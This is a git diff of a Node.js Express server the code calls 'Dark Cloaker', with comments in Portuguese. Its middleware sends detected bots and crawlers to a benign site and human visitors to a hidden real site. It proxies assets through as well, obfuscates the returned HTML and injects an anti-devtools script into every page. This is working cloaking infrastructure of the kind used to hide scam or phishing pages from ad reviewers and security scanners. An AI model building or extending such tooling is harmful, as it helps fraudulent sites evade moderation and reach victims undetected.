@@ -3,26 +3,27 @@ const express = require("express");
 const mongoose = require("mongoose");
 const cors = require("cors");
 const helmet = require("helmet");
-const axios = require("axios");
+const { createProxyMiddleware } = require("http-proxy-middleware");
 const { isBot } = require("./utils/botDetection");
 const { mutateHTMLSafe } = require("./utils/mutator");
 const Domain = require("./models/Domain");
+const axios = require("axios");
 
 const app = express();
 
-// 🔒 Segurança básica
+// Segurança
 app.use(cors());
 app.use(helmet());
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// 📂 Rotas da API
+// Rotas API
 const authRoutes = require("./routes/auth.routes");
 const domainRoutes = require("./routes/domain.routes");
 app.use("/api/auth", authRoutes);
 app.use("/api/domain", domainRoutes);
 
-// 🔌 Conexão com MongoDB
+// Conexão Mongo
 (async () => {
   try {
     await mongoose.connect(process.env.MONGO_URI);
@@ -33,33 +34,47 @@ app.use("/api/domain", domainRoutes);
   }
 })();
 
-// ⚔️ Middleware de cloaking cego (pega todas as rotas não-API)
+// Middleware principal do cloaking
 app.use(async (req, res, next) => {
   try {
-    // Ignora rotas da API
-    if (req.path.startsWith("/api")) return next();
-
     const host = req.hostname;
     const ua = req.headers["user-agent"] || "";
     const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
+    const urlPath = req.originalUrl;
 
     const domain = await Domain.findOne({ officialUrl: `https://${host}` });
     if (!domain) return res.redirect("https://google.com");
 
-    const isBotVisit = isBot(ua, ip); // true = bot/crawler
-    const urlAlvo = isBotVisit ? domain.baseUrl : domain.realUrl;
-    const destino = `${urlAlvo}${req.originalUrl}`;
+    const isBotVisit = isBot(ua, ip);
+    const targetUrl = isBotVisit ? domain.baseUrl : domain.realUrl;
+    const fullUrl = `${targetUrl}${urlPath}`;
 
+    // Verifica se é asset (arquivo)
+    const isAsset = /\.(js|css|png|jpe?g|gif|svg|woff2?|ttf|eot|ico|json|txt|webp|mp4|map)(\?.*)?$/.test(urlPath);
+    if (isAsset) {
+      return createProxyMiddleware({
+        target: targetUrl,
+        changeOrigin: true,
+        selfHandleResponse: false,
+        headers: {
+          "User-Agent": ua,
+          "X-Forwarded-For": ip,
+          Referer: req.get("referer") || '',
+        }
+      })(req, res);
+    }
+
+    // Requisição principal HTML (index)
     const headers = {
       "User-Agent": ua,
       "X-Forwarded-For": ip,
       Referer: req.get("referer") || '',
     };
 
-    const response = await axios.get(destino, { headers });
+    const response = await axios.get(fullUrl, { headers });
     let html = response.data;
 
-    // 🔐 Anti-clonagem e Devtools
+    // Injeção de script anti-clonagem/devtools
     const antiDebug = `
       <script>
         function devtoolsDetector(){
@@ -82,11 +97,11 @@ app.use(async (req, res, next) => {
       </script>
     `;
 
-    let mutado = mutateHTMLSafe(html);
-    mutado = mutado.replace("</body>", `${antiDebug}</body>`);
+    html = mutateHTMLSafe(html);
+    html = html.replace("</body>", `${antiDebug}</body>`);
 
     res.setHeader("Content-Type", "text/html; charset=utf-8");
-    return res.send(mutado);
+    return res.send(html);
 
   } catch (err) {
     console.error("❌ Erro proxy blindado:", err.message);
@@ -94,7 +109,7 @@ app.use(async (req, res, next) => {
   }
 });
 
-// 🚀 Iniciar servidor
+// Início do servidor
 const PORT = process.env.PORT || 8080;
 app.listen(PORT, () => {
   console.log(`☠️ Dark Cloaker rodando blindado na porta ${PORT}`);
